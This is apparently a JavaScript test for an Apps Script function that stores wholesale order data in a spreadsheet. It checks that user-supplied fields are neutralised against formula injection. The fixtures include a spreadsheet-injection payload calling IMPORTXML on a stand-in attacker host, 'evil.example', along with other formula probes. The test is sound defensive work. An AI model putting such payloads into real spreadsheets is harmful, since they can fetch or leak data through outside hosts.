import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

test('el espejo de mayoristas guarda textos externos sin ejecutar fórmulas y conserva los importes', () => {
  const context = vm.createContext({});
  vm.runInContext(fs.readFileSync(new URL('../../apps-script/Mayoristas.gs', import.meta.url), 'utf8'), context);
  const row = context.tintinWholesaleRow_('WQ_fixture_123456', {
    customerName: '=IMPORTXML("https://evil.example", "//a")',
    businessName: 'Bella', whatsapp: '+595912345678', city: 'Luque',
    notes: '\t=1+1', adminNote: '@SUM(1)', total: 150000,
    items: [{ name: '=1+1', qty: 2, unitPrice: 75000 }], itemCount: 2,
  });
  assert.equal(row[5], '\'=IMPORTXML("https://evil.example", "//a")');
  assert.equal(row[7], 'Bella');
  assert.equal(row[8], "'+595912345678");
  assert.equal(row[9], 'Luque');
  assert.equal(row[13], 150000);
  assert.equal(row[14], "'=1+1 x2 — Gs. 75000 c/u");
  assert.equal(row[15], "'\t=1+1");
  assert.equal(row[16], "'@SUM(1)");
});
